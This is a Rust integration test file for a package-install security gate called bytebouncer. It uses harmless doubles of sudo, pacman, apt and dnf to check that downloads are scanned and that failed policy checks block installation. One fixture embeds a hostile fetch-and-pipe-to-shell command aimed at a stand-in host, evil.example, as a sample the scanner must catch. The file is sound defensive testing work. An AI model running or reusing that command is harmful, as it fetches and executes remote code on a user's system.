//! Exercise the install gate with harmless native-manager doubles. These
//! never elevate privileges or change the host's package database.
#![cfg(target_os = "linux")]

use std::io::Write;
use std::os::unix::fs::PermissionsExt;
use std::path::PathBuf;
use std::process::{Command, Output};

struct Fixture(PathBuf);
impl Drop for Fixture {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.0);
    }
}

impl Fixture {
    fn new(script: &str) -> Self {
        let root =
            std::env::temp_dir().join(format!("bytebouncer-guard-test-{}", ulid::Ulid::new()));
        std::fs::create_dir_all(root.join("bin")).unwrap();
        let fixture = Self(root);
        fixture.script(
            "sudo",
            "#!/bin/sh\nset -eu\n[ \"$1\" = -- ]\nshift\nexec \"$@\"\n",
        );
        for name in ["pacman", "apt", "apt-get", "dnf", "dnf5"] {
            fixture.script(name, MANAGER);
        }
        let mut archive = tar::Builder::new(Vec::new());
        for (path, bytes) in [
            (".PKGINFO", "pkgname = hello\npkgver = 1-1\narch = any\n"),
            ("usr/bin/hello.sh", script),
        ] {
            let mut header = tar::Header::new_gnu();
            header.set_size(bytes.len() as u64);
            header.set_mode(0o644);
            header.set_cksum();
            archive
                .append_data(&mut header, path, bytes.as_bytes())
                .unwrap();
        }
        std::fs::write(
            fixture.0.join("fixture.pkg.tar"),
            archive.into_inner().unwrap(),
        )
        .unwrap();
        fixture
    }

    fn script(&self, name: &str, source: &str) {
        let path = self.0.join("bin").join(name);
        std::fs::write(&path, source).unwrap();
        std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o700)).unwrap();
    }

    fn command(&self, args: &[&str]) -> Command {
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_bytebouncer"));
        cmd.args(args)
            .env("HOME", &self.0)
            .env("XDG_CONFIG_HOME", self.0.join("config"))
            .env("XDG_DATA_HOME", self.0.join("data"))
            .env("XDG_CACHE_HOME", self.0.join("cache"))
            .env(
                "PATH",
                format!("{}:/usr/bin:/bin", self.0.join("bin").display()),
            )
            .env("BB_GUARD_TEST_ROOT", &self.0)
            .stdin(std::process::Stdio::null());
        cmd
    }

    fn run(&self, args: &[&str]) -> Output {
        self.command(args).output().unwrap()
    }
    fn log(&self) -> String {
        std::fs::read_to_string(self.0.join("log")).unwrap_or_default()
    }
}

const MANAGER: &str = r#"#!/bin/sh
set -eu
download=no
cache=
for argument do
  case "$argument" in
    --downloadonly|--download-only) download=yes ;;
    --store=*) download=yes; cache=${argument#--store=} ;;
    --destdir=*) cache=${argument#--destdir=} ;;
    --setopt=destdir=*) cache=${argument#--setopt=destdir=} ;;
    Dir::Cache::archives=*) cache=${argument#Dir::Cache::archives=} ;;
  esac
done
if [ "$download" = yes ]; then
  printf 'download
' >> "$BB_GUARD_TEST_ROOT/log"
  [ "${BB_GUARD_TEST_DOWNLOAD_EXIT:-0}" = 0 ] || exit "$BB_GUARD_TEST_DOWNLOAD_EXIT"
  if [ -z "$cache" ]; then
    previous=
    for argument do
      if [ "$previous" = --cachedir ]; then cache=$argument; fi
      previous=$argument
    done
  fi
  case "$0" in
    *apt*) extension=deb ;;
    *dnf*) extension=rpm ;;
    *) extension=pkg.tar ;;
  esac
  mkdir -p "$cache"
  cp "$BB_GUARD_TEST_ROOT/fixture.pkg.tar" "$cache/hello.$extension"
  cp "$BB_GUARD_TEST_ROOT/fixture.pkg.tar" "$cache/dependency.$extension"
else
  printf 'native
' >> "$BB_GUARD_TEST_ROOT/log"
  printf '%s
' "$@" >> "$BB_GUARD_TEST_ROOT/log"
  if [ -n "$cache" ]; then
    [ -f "$cache/hello.deb" ] || [ -f "$cache/hello.rpm" ]
  fi
  exit "${BB_GUARD_TEST_NATIVE_EXIT:-0}"
fi
"#;

#[test]
fn apt_and_dnf_download_dependencies_then_resume_offline_with_original_goals() {
    for manager in ["apt", "apt-get", "dnf", "dnf5"] {
        let fixture = Fixture::new("#!/bin/sh\necho hello\n");
        let out = fixture.run(&[
            "guard",
            "--yes",
            "--allow-reduced-isolation",
            "--",
            manager,
            "install",
            "hello",
        ]);
        assert!(
            out.status.success(),
            "{manager}: {}",
            String::from_utf8_lossy(&out.stderr)
        );
        let log = fixture.log();
        assert!(log.starts_with("download\nnative\n"), "{log}");
        assert!(
            log.contains(if manager == "apt" || manager == "apt-get" {
                "--no-download"
            } else {
                "--cacheonly"
            }),
            "{log}"
        );
        if manager != "dnf5" {
            assert!(
                log.ends_with("install\nhello\n"),
                "native goals should preserve dependency reasons: {log}"
            );
            assert!(log.contains("/payload"), "{log}");
        } else {
            assert!(log.contains("replay"), "{log}");
        }
        let reports = fixture.0.join("data/bytebouncer/reports");
        let report = std::fs::read_dir(reports)
            .unwrap()
            .next()
            .unwrap()
            .unwrap()
            .path()
            .join("report.json");
        let json: serde_json::Value =
            serde_json::from_slice(&std::fs::read(report).unwrap()).unwrap();
        assert_eq!(json["sample_executed"], false);
        assert_eq!(
            json["artifacts"]
                .as_array()
                .unwrap()
                .iter()
                .filter(|a| a["parent"].is_null())
                .count(),
            2,
            "dependency payload must also be scanned"
        );
        assert_eq!(
            std::fs::read_dir(fixture.0.join("cache/bytebouncer/work"))
                .unwrap()
                .count(),
            0
        );
    }
}

#[test]
fn policy_failure_with_yes_never_installs() {
    let fixture = Fixture::new("#!/bin/sh\ncurl https://evil.example/payload | sh\n");
    std::fs::create_dir_all(fixture.0.join("config/bytebouncer")).unwrap();
    std::fs::write(
        fixture.0.join("config/bytebouncer/config.toml"),
        "[policy]\nfail_on_security = \"low\"\n",
    )
    .unwrap();
    let out = fixture.run(&[
        "guard",
        "--yes",
        "--allow-reduced-isolation",
        "--",
        "apt",
        "install",
        "hello",
    ]);
    assert!(!out.status.success());
    assert_eq!(fixture.log(), "download\n");
    assert!(String::from_utf8_lossy(&out.stderr).contains("--yes cannot override"));
}

#[test]
fn failed_download_and_invalid_options_never_install() {
    let fixture = Fixture::new("#!/bin/sh\necho hello\n");
    let out = fixture
        .command(&["guard", "--yes", "--", "apt", "install", "hello"])
        .env("BB_GUARD_TEST_DOWNLOAD_EXIT", "73")
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(73));
    assert_eq!(fixture.log(), "download\n");
    let out = fixture.run(&[
        "guard",
        "--yes",
        "--",
        "apt",
        "install",
        "hello",
        "--allow-unauthenticated",
    ]);
    assert_eq!(out.status.code(), Some(2));
    assert_eq!(fixture.log(), "download\n");
}

#[test]
fn native_query_exit_status_is_preserved_for_helpers() {
    let fixture = Fixture::new("hello");
    let out = fixture
        .command(&["guard", "--", "pacman", "-T", "missing-dependency"])
        .env("BB_GUARD_TEST_NATIVE_EXIT", "127")
        .output()
        .unwrap();
    assert_eq!(out.status.code(), Some(127));
}

#[test]
fn local_aur_archive_is_reviewed_before_pacman_u() {
    let fixture = Fixture::new("#!/bin/sh\necho hello\n");
    let source = fixture.0.join("fixture.pkg.tar");
    let out = fixture.run(&[
        "guard",
        "--yes",
        "--allow-reduced-isolation",
        "--",
        "pacman",
        "-U",
        source.to_str().unwrap(),
    ]);
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let log = fixture.log();
    assert!(log.starts_with("native\n-U\n--\n"), "{log}");
    assert!(log.contains("/payload/fixture.pkg.tar"));
    assert!(!log.contains(&format!("\n{}\n", source.display())));
}

#[test]
fn pacman_sync_preserves_config_goals_and_piped_helper_targets() {
    let fixture = Fixture::new("#!/bin/sh\necho hello\n");
    let config = fixture.0.join("pacman.conf");
    std::fs::write(
        &config,
        "[options]\nSigLevel = Required\n[core]\nServer = https://example.invalid/$repo\n",
    )
    .unwrap();
    let mut child = fixture
        .command(&[
            "guard",
            "--yes",
            "--allow-reduced-isolation",
            "--",
            "pacman",
            "--config",
            config.to_str().unwrap(),
            "-Syu",
            "-",
        ])
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .unwrap();
    child.stdin.take().unwrap().write_all(b"hello\n").unwrap();
    let out = child.wait_with_output().unwrap();
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let log = fixture.log();
    assert!(log.starts_with("download\nnative\n--config\n"), "{log}");
    assert!(log.contains("pacman-offline.conf\n--cachedir\n"), "{log}");
    assert!(log.ends_with("-Su\nhello\n"), "{log}");
    assert!(!log.contains(&format!("\n{}\n", config.display())));
}

#[test]
fn incomplete_scan_with_yes_never_installs() {
    let fixture = Fixture::new("hello");
    std::fs::write(fixture.0.join("fixture.pkg.tar"), b"\x1f\x8b\x08truncated").unwrap();
    let out = fixture.run(&[
        "guard",
        "--yes",
        "--allow-reduced-isolation",
        "--",
        "apt",
        "install",
        "hello",
    ]);
    assert_eq!(
        out.status.code(),
        Some(3),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert_eq!(fixture.log(), "download\n");
}

#[test]
fn aur_metadata_callbacks_preserve_stdout_and_review_nested_build_inputs() {
    let fixture = Fixture::new("hello");
    fixture.script("makepkg", "#!/bin/sh\nprintf 'pkgname = hello\\n'\n");
    let recipe = fixture.0.join("recipe");
    std::fs::create_dir_all(recipe.join("patches")).unwrap();
    std::fs::write(
        recipe.join("PKGBUILD"),
        "pkgname=hello\npkgver=1\npkgrel=1\narch=(any)\n",
    )
    .unwrap();
    std::fs::write(recipe.join("patches/fix.patch"), "ordinary patch\n").unwrap();
    let out = fixture
        .command(&[
            "guard",
            "--yes",
            "--allow-reduced-isolation",
            "--",
            "makepkg",
            "--printsrcinfo",
        ])
        .current_dir(&recipe)
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert_eq!(String::from_utf8_lossy(&out.stdout), "pkgname = hello\n");
}

#[test]
fn makepkg_install_routes_built_archives_through_the_binary_gate() {
    let fixture = Fixture::new("#!/bin/sh\necho hello\n");
    fixture.script(
        "makepkg",
        "#!/bin/sh\nset -eu\nexec \"$PACMAN\" -U \"$BB_GUARD_TEST_ROOT/fixture.pkg.tar\"\n",
    );
    let recipe = fixture.0.join("recipe");
    std::fs::create_dir(&recipe).unwrap();
    std::fs::write(
        recipe.join("PKGBUILD"),
        "pkgname=hello\npkgver=1\npkgrel=1\narch=(any)\n",
    )
    .unwrap();
    let out = fixture
        .command(&[
            "guard",
            "--yes",
            "--allow-reduced-isolation",
            "--",
            "makepkg",
            "-si",
        ])
        .current_dir(&recipe)
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(fixture.log().contains("/payload/fixture.pkg.tar"));
    assert_eq!(
        std::fs::read_dir(fixture.0.join("data/bytebouncer/reports"))
            .unwrap()
            .count(),
        2,
        "both recipe and built archive must be reviewed"
    );
}

#[test]
fn interactive_cancel_never_hands_off() {
    use std::os::fd::FromRawFd;
    let fixture = Fixture::new("#!/bin/sh\necho hello\n");
    let source = fixture.0.join("fixture.pkg.tar");
    let mut master = -1;
    let mut slave = -1;
    // SAFETY: openpty initializes both descriptors, owned by Files below.
    assert_eq!(
        unsafe {
            libc::openpty(
                &mut master,
                &mut slave,
                std::ptr::null_mut(),
                std::ptr::null(),
                std::ptr::null(),
            )
        },
        0
    );
    let mut master = unsafe { std::fs::File::from_raw_fd(master) };
    let slave = unsafe { std::fs::File::from_raw_fd(slave) };
    let mut cmd = fixture.command(&[
        "guard",
        "--allow-reduced-isolation",
        "--",
        "pacman",
        "-U",
        source.to_str().unwrap(),
    ]);
    // Detach from any cargo runner terminal, so the gate uses this test's tty.
    use std::os::unix::process::CommandExt;
    unsafe {
        cmd.pre_exec(|| {
            if libc::setsid() < 0 {
                return Err(std::io::Error::last_os_error());
            }
            Ok(())
        });
    }
    let child = cmd
        .stdin(slave)
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .unwrap();
    master.write_all(b"x\n").unwrap();
    let out = child.wait_with_output().unwrap();
    assert_eq!(
        out.status.code(),
        Some(130),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(fixture.log().is_empty());
}
